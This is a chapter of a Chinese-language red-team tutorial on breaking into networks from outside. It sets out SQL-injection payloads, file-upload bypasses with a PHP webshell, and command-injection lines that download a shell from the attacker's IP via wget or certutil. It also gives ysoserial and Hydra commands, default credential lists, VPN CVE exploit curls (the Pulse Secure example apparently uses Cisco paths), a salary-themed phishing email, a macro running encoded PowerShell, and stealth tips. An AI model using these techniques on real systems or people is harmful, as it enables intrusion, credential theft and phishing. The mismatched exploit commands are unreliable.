## 📖 写在前面

前面几章，我们讲了红队是什么、讲了作战地图、讲了前期侦察、讲了C2基础设施。

这一章，我们终于要进入"正式攻击环节"了——外网打点。

什么是打点？简单说就是：**从外网找到一个突破口，打进去，拿到第一台机器的权限。**

这第一步很重要，就像打仗找攻城口，你得先在城墙上撕开一个口子，才能进城。

我给你讲个真实的故事：

有一次护网，有个红队去打一个政府部门。他们扫了半天，没找到什么漏洞。换了好几个人、试了好多种方法，就是打不进去。

后来换了个思路——他们不再死磕技术漏洞，而是去看了看这个部门的子公司。结果发现子公司有个外包开发的系统，那个系统有个SQL注入漏洞。

打进去了之后，发现这个子公司和母公司是同一个域环境，直接从子公司横向到了母公司，拿下了整个目标。

**所以，打点这个事，有时候不是技术的问题，是思路的问题。**

这一章我们就来聊聊，红队在外网一般怎么打点，有哪些常见的突破口，有哪些实用的技巧，以及红队和普通渗透测试的区别在哪里。

坐稳了，我们开讲。

## 5.1 外网打点是个啥？

### 5.1.1 用大白话解释打点

"打点"是红队的行话，意思就是：**找到一个切入点，从外网打进内网。**

你在外边，目标在里边，中间隔着防火墙、隔着边界设备。你得找到一个"门"或者"窗户"，从这个地方钻进去。

这个找门、钻进去的过程，就叫"打点"。

打点成功的标志是什么？就是你拿到了**初始访问权限**——

不管是WebShell，还是RDP远程桌面，还是SSH，还是一句话，**你能对内网里的一台机器说上话了、控制住了，就算打点成功了。**

### 5.1.2 红队打点 vs 渗透测试打点

可能你会说："这不就是渗透测试的漏洞利用吗？有啥不一样的？"

还真不太一样。

**渗透测试打点：**
- 给你一个范围，你就照着测
- 一个个漏洞找，找到漏洞就报告
- 报告完了就完事

**红队打点：**
- 目标不是为了找漏洞，目标是**打进去**
- 漏洞只是手段，拿到权限才是目的
- 不择手段，什么方法好用用什么

打个比方：
- 渗透测试像是医生体检，把你身上的伤都找出来，列个清单给你
- 红队像是小偷入室，只要能进去，怎么进去都行

所以红队打点的思路更活，不会死磕一个漏洞，而是各种方法都试，哪个好用哪个。

### 5.1.3 打点的三个阶段

红队外网打点一般分三个阶段：

```
第一阶段：信息收集（上一章讲过了）
  → 收集目标的所有资产信息
  → 了解目标的"门面"

第二阶段：突破口寻找
  → 从收集到的信息里找可能的突破口
  → Web漏洞？VPN？邮件系统？OA系统？

第三阶段：漏洞利用
  → 找到突破口之后，想办法利用
  → 拿到初始权限
  → 植入C2马

打进去了，就是初始访问成功。
```

## 5.2 突破口在哪里？

打点的核心问题是：**突破口在哪？**

红队最喜欢从哪里打进去？我给你列个清单：

### 5.2.1 Web应用（最常见的突破口）

Web应用是最常见的突破口，因为：
- 数量多（每个公司少说有几个，多则几十上百个Web站点）
- 问题多（开发人员水平参差不齐，安全意识不够）
- 直接面对外网（肯定开放80/443端口）

**常见的Web漏洞类型：**

```
高危漏洞（优先打）：
  • SQL注入
  • 文件上传（Getshell）
  • 命令注入
  • 反序列化漏洞
  • 逻辑漏洞（越权、支付漏洞等）

中危漏洞（可以打）：
  • XSS（存储型，可能打到后台）
  • CSRF
  • 弱口令（后台、API）
  • JWT漏洞（如果用JWT认证）

低危漏洞（一般不打，收益太低）：
  • 信息泄露
  • Flash XSS
  • URL跳转
```

### 5.2.2 VPN（远程办公入口）

VPN也是个重灾区，原因：
- 一般放在边界，面向互联网
- 员工使用，安全性要求高但配置复杂
- 很多VPN有已知漏洞
- 爆破成功率不低

**VPN常见问题：**
- 默认口令（很多VPN安装后不改默认口令）
- 暴力破解（员工密码弱）
- VPN漏洞（历史上有很多CVE）
- VPN配置错误

### 5.2.3 邮件系统

邮件系统也很重要：
- 有大量员工账号
- 邮件里可能有敏感信息
- 很多公司用Outlook Web Access（OWA）

**邮件系统常见问题：**
- 弱口令爆破
- 钓鱼（发钓鱼邮件给员工）
- 邮件钓鱼（恶意附件、恶意链接）
- 邮件系统漏洞

### 5.2.4 OA系统（企业办公自动化）

OA系统是企业的标配，但安全参差不齐：
- 用的是商业OA（泛微、致远、通达、蓝凌...）
- 或者自研OA
- 都有历史漏洞

**OA系统常见问题：**
- 弱口令（admin/admin这种）
- 文件上传漏洞
- SQL注入
- 后台未授权访问
- 反序列化漏洞

> 💡 **真实案例：**
>
> 某红队打一个目标，先扫了一遍没发现什么漏洞。
>
> 后来听别人说那个公司用的是某品牌OA，版本很老。
>
> 一查，这个版本有个已知的后台文件上传漏洞。
>
> 试了一下，后台弱口令：admin/admin。
>
> 进了后台，直接文件上传Getshell。
>
> 打进去了。

### 5.2.5 边界网络设备

有时候别忘了边界上的设备：
- 路由器、交换机（默认口令）
- 防火墙（WEB管理后台弱口令）
- 堡垒机（漏洞）
- 无线AP控制器
- 摄像头、门禁系统

这些设备往往被人忽略，安全性差。

### 5.2.6 子公司/供应链

有时候直接打母公司打不进去，可以试试：
- 子公司（安全可能差一些）
- 合作伙伴
- 外包/供应商
- 第三方SaaS服务

这些是"供应链攻击"，通过打第三方进入目标。

### 5.2.7 移动应用（App/小程序）

别忘了还有App和小程序：
- 抓包分析App
- 找API漏洞
- 找接口未授权访问
- 找WebView漏洞

### 5.2.8 社会工程学（钓鱼）

技术不行就社工：
- 发钓鱼邮件
- 发钓鱼短信
- 打电话冒充IT
- 微信/QQ社工

社工的成功率往往比技术攻击高，因为人是最薄弱的环节。

## 5.3 Web漏洞详解

Web漏洞是最常见的突破口，这一节我们详细讲讲常见的Web漏洞怎么打。

### 5.3.1 SQL注入

SQL注入是个老牌漏洞了，但现在依然很多站点存在。

**怎么判断？**

在URL参数或者表单里输入：
- `'`
- `"`  
- `1 or 1=1`
- `1' and '1'='1`

看页面有没有报错、或者返回内容有没有变化。

**怎么利用？**

有回显的可以直接union注入：
```sql
' union select 1,2,3,4--
' union select 1,user(),3,4--
' union select 1,schema_name,3,4 from information_schema.schemata--
```

没回显的用布尔盲注或者时间盲注：
```sql
' and 1=1-- (页面正常)
' and 1=2-- (页面错误)
```

**拿到数据：**
```sql
-- 拿数据库名
' union select 1,database(),3,4--

-- 拿表名
' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='xxx'--

-- 拿列名
' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='admin'--

-- 拿账号密码
' union select 1,group_concat(username,0x3a,password),3,4 from admin--
```

### 5.3.2 文件上传

文件上传是Web漏洞里最直接的，可以直接Getshell。

**怎么判断？**

找上传点：
- 头像上传
- 文件上传功能
- 后台管理处
- 富文本编辑器

测试上传：
- 上传正常图片看返回路径
- 上传脚本文件（.php、.asp、.jsp、.aspx）看能不能解析

**上传绕过技巧：**

有时候有过滤，要绕过：

```
1. 前端验证绕过
   → 禁用JS
   → 抓包改后缀

2. MIME类型绕过
   → Content-Type改成image/jpeg

3. 扩展名绕过
   → 大小写：.pHp、.ASP
   → 双重扩展：shell.php.jpg
   → 特殊扩展：shell.php3、shell.phtml、shell.phar

4. 内容绕过
   → 文件头加GIF89a（伪装成图片）
   → 图片马（把脚本藏在图片里）

5. 解析漏洞
   → 利用Apache/Nginx解析漏洞
   → shell.jpg/.php

6. .htaccess绕过
   → 上传.htaccess，内容：AddType application/x-httpd-php .jpg
   → 再上传.jpg，内容是php代码
```

**Getshell成功之后：**

```bash
# 找WebShell管理工具
# 蚁剑、哥斯拉、冰蝎都行

# 或者直接用命令行
<?php system($_GET['cmd']); ?>
# 访问：url/shell.php?cmd=whoami
```

### 5.3.3 命令注入

命令注入是在有命令执行功能的点，输入系统命令。

**怎么判断？**

找有命令执行的点：
- Ping功能（常见于网络监控类站点）
- Traceroute功能
- DNS查询功能
- 表达式计算功能
- ......

测试：
- `; whoami`
- `| whoami`
- `& whoami`
- `whoami`（直接输）

看有没有回显。

**怎么利用？**

```bash
# Linux目标
; cat /etc/passwd
; ls -la /var/www/html
; wget http://你的IP/shell.txt -O shell.php

# Windows目标
; type C:\Windows\win.ini
; certutil -urlcache -split -f http://你的IP/shell.exe shell.exe
```

### 5.3.4 反序列化漏洞

反序列化是Java Web应用里很常见的问题。

**怎么判断？**

找用序列化的地方：
- Java对象传输（REST API）
- Session存储
- 缓存（Redis、Memcached）
- RMI/JMX服务

测试：
- 找有序列化的接口
- 用ysoserial生成payload
- 发过去看有没有回显

**ysoserial使用：**

```bash
# 生成反弹Shell的payload
java -jar ysoserial.jar Jdk7u21 "touch /tmp/pwned" > payload.ser

# 生成命令执行的payload（URLDNS）
java -jar ysoserial.jar URLDNS http://你的域名/test > payload.ser

# 发送到目标
curl -X POST -d "@payload.ser" http://target/vuln_endpoint
```

### 5.3.5 弱口令

弱口令虽然简单，但非常好用。

**常见弱口令：**

```
系统/后台弱口令：
  • admin/admin
  • admin/password
  • admin/123456
  • admin/admin888
  • admin/manager
  • administrator/administrator
  • root/root
  • root/toor

数据库弱口令：
  • root/root
  • root/123456
  • sa/sa
  • postgres/postgres

Web应用弱口令：
  • test/test
  • guest/guest
  • user/user
  • demo/demo
```

**爆破工具：**

```bash
# Burp Suite intruder
# Hydra
hydra -l admin -P pass.txt target http-post-form "/login:username=^USER^&password=^PASS^:Login failed"
```

### 5.3.6 逻辑漏洞

逻辑漏洞是程序员的逻辑错误，不是具体的漏洞类型。

**常见逻辑漏洞：**

```
1. 验证码绕过
   → 验证码不刷新
   → 验证码可爆破
   → 验证码回显在前端

2. 暴力破解
   → 没有账号锁定
   → 没有验证码
   → 没有IP限制

3. 越权操作
   → 水平越权（看别人的数据）
   → 垂直越权（普通用户变管理员）

4. 密码找回漏洞
   → Token可预测
   → Token在URL里
   → 邮箱重置链接可被爆破

5. 支付漏洞
   → 负数价格
   → 0元支付
   → 修改商品数量
```

### 5.3.7 未授权访问

未授权访问就是不用登录就能访问到需要权限的页面。

**常见未授权访问点：**

```
管理后台未授权：
  • /admin
  • /manage
  • /system
  • /backup

API未授权：
  • /api/admin/
  • /api/v1/users
  • /swagger-ui.html
  • /actuator/

数据库接口：
  • /phpmyadmin
  • /adminer.php
  • /redis
  • /manager/html

其他：
  • /swagger
  • /api-docs
  • /env
  • /actuator/env
```

## 5.4 VPN打点

VPN是另一个重要的突破口。

### 5.4.1 VPN常见漏洞

**1. 默认口令**

很多VPN有默认口令，安装后管理员不修改：
```
# Cisco VPN
admin/admin
admin/cisco

# Fortinet FortiGate
admin/

# Pulse Secure
admin/admin
```

**2. 历史CVE**

主流VPN都有历史漏洞：
- Pulse Secure VPN（CVE-2019-11510）
- FortiGate VPN（CVE-2018-13379）
- Citrix VPN（CVE-2019-19781）
- Palo Alto VPN（CVE-2020-2021）

**3. 暴力破解**

VPN登录页面可以爆破：
- 收集用户名（从前面信息收集得到）
- 用社工字典爆破
- 注意账号锁定限制

### 5.4.2 VPN漏洞利用

**Pulse Secure CVE-2019-11510：**

这个漏洞可以任意文件读取，包括读取密码文件。

```bash
# 检查漏洞
curl -k https://target/+CSCOE+/logon.html

# 利用（读取密码文件）
curl -k -H "Cookie: _ga=1.2.1; SESSIONNAME=sessionname" "https://target/+CSCS+/manifest?algorithm=SHA1" -o hash.txt
```

**FortiGate CVE-2018-13379：**

```bash
# 利用（读取SSL VPN session）
curl -k "https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
```

## 5.7 社工钓鱼

有时候技术打不进去，就试试社工。

### 5.7.1 社工的基本思路

社工的核心是"骗"，骗目标做你希望他做的事。

**社工的基本步骤：**

```
1. 信息收集（了解目标）
   → 目标是谁？
   → 他关心什么？
   → 他的弱点是什么？

2. 准备诱饵（制作钓鱼内容）
   → 钓鱼邮件
   → 钓鱼网站
   → 恶意文件

3. 钓鱼投递（发送诱饵）
   → 邮件、短信、微信
   → 怎么让他相信？

4. 收网（等他上钩）
   → 他打开了文件？
   → 他输入了密码？
   → 他运行了程序？
```

### 5.7.2 钓鱼邮件怎么写

钓鱼邮件要有"三要素"：
- 标题吸引人
- 内容可信
- 让目标有行动的理由

**好的钓鱼邮件：**

```
标题：2024年度工资调整方案（请务必查收）

正文：

王经理您好，

根据公司2024年薪酬调整计划，您的工资将有如下调整：
- 基本工资上调10%
- 绩效奖金比例提高5%
- 详细方案见附件

请于本周五前确认回复。

人力资源部
2024年1月15日

附件：工资调整方案.docm
```

看到"工资"两个字，99%的人都会点。

**钓鱼邮件的技巧：**
- 用真实的公司名称
- 用真实的邮件格式
- 内容要像正常邮件
- 不要有明显的错误（错别字、奇怪的语法）
- 最好能叫出对方名字（社工库或领英能查到）
- 发布时间选工作日的早上或下午刚上班

### 5.7.3 恶意文件怎么绑

钓鱼邮件一般会带附件，附件要有恶意代码。

**宏病毒（Word/Excel）：**

```vb
Sub Auto_Open()
    Shell "cmd.exe /c powershell -enc BASE64编码的命令"
End Sub
```

**快捷方式钓鱼（Lnk）：**

创建一个.lnk文件，运行的时候执行恶意命令。

**自解压文件：**

把木马和正常文件打包成自解压文件，运行的时候解压正常文件+执行木马。

## 5.8 打点的注意事项

最后讲几个打点的注意事项。

### 5.8.1 别打草惊蛇

打点的时候最忌讳打草惊蛇：
- 别一次攻击太猛，触发告警
- 别用太明显的漏洞名称（容易被溯源）
- 别在不该留痕迹的地方留痕迹
- 别影响目标正常业务

### 5.8.2 先打边缘资产

主站防护太严，就打边缘：
- 测试站
- 子公司的站点
- 旧系统
- 内部工具的外网入口

### 5.8.3 多条路线并行

不要死磕一条路：
- 同时尝试多个突破口
- 这个不行换那个
- 总有一条路能通

### 5.8.4 注意时间

打点也要注意时间：
- 工作日白天打，成功率更高（人在机器旁）
- 快下班的时候打也行（人急着走，警惕性低）
- 深夜周末少打（人不在机器旁，反馈慢）

### 5.8.5 拿到权限后怎么办

拿到WebShell之后，先别急着横向：
1. 收集本机信息（systeminfo、用户、进程、网卡）
2. 判断有没有杀软（tasklist /svc）
3. 判断是不是域环境（net view /domain）
4. 上传免杀马到C2
5. 确认C2上线了再操作
6. 后续横向移动

## 5.9 本章总结

这一章我们讲了外网打点。

我们讲了：
- 打点是什么，和渗透测试的区别
- 常见的突破口（Web、VPN、邮件、OA、边界设备、子公司、社工）
- 常见Web漏洞怎么打（SQL注入、文件上传、命令注入、反序列化、弱口令、逻辑漏洞）
- VPN、邮件系统、OA系统的漏洞
- 社会工程学钓鱼
- 打点的注意事项

**打点是红队攻击的第一步，也是最重要的一步。打得进去，后面的内网才有戏；打不进去，一切白搭。**

打点要有思路：
- 先扫盲点（子公司、边缘资产）
- 多条路线并行（不要死磕）
- 技术不够社工凑
- 保持隐蔽，别打草惊蛇
